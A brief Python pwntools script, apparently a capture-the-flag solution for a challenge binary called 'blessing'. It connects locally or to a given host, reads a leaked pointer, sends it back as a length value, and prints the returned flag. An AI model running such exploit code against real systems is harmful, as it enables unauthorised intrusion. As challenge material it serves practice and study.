#!/usr/bin/env python3

from pwn import *

def exploit(io):
    io.recvuntil(b"accept this: ")
    pointer_leak = int(io.recv(14).decode(), 16)
    io.sendlineafter(b"length: ", str(pointer_leak).encode())
    io.sendafter(b"song: ", b"A")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = process("./blessing")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    exploit(io)

if __name__ == "__main__":
    main()
